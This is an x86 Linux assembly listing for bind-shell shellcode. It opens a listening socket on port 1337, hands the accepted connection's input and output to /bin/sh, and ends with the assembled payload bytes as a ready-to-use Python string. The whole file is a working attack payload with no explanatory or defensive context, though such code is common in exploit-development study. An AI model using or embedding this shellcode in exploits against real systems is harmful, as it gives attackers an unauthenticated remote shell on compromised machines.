global _start

_start:
    ; socket(2, 1, 0);
    xor eax, eax         ; $eax = 0x0
    mov ax, 0x167        ; $eax = socket()

    push 0x2             ; AF_INET
    pop ebx              ; $ebx = AF_INET

    push 0x1             ; SOCK_STREAM
    pop ecx              ; $ecx = SOCK_STREAM

    cdq                  ; $edx = 0x0

    int 0x80             ; syscall

    ; bind(s, [2, 1337, 0], 16);
    mov ebx, eax         ; descriptor

    push edx             ; "0.0.0.0"
    push word 0x3905     ; 1337
    push word 0x2        ; AF_INET
    mov ecx, esp         ; sockaddr_in

    mov dl, 0x10         ; len struct

    mov ax, 0x169        ; $eax = bind()
    int 0x80             ; syscall

    ; listen(s, 0);
    xor ecx, ecx         ; backlog
    mov ax, 0x16b        ; $eax = listen()
    int 0x80             ; syscall

    ; accept4(s, 0, 0, 0);
    mov ax, 0x16c        ; accept()
    cdq                  ; addrlen
    xor esi, esi         ; flags
    int 0x80             ; syscall

    ; dup2(clientfd, fd);
    mov ebx, eax         ; descriptor
    mov cl, 0x2          ; counter

    .loop:
        mov al, 0x3f     ; $eax = dup2()
        int 0x80         ; syscall

        dec ecx          ; $ecx -= 1
        jns .loop        ; if ecx != 0

        ; execve("/bin/sh", NULL, NULL);
        mov al, 0xb      ; $eax = execve()
        push 0x68        ; "h"
        push word 0x732f ; "/s"
        push 0x6e69622f  ; "/bin"
        mov ebx, esp     ; $ebx = "/bin/sh"

        xor ecx, ecx     ; $ecx = NULL

        int 0x80         ; syscall

; shellcode = b"\x31\xc0\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\x99\xcd\x80\x89\xc3\x52\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x69\x01\xcd\x80\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x66\xb8\x6c\x01\x99\x31\xf6\xcd\x80\x89\xc3\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
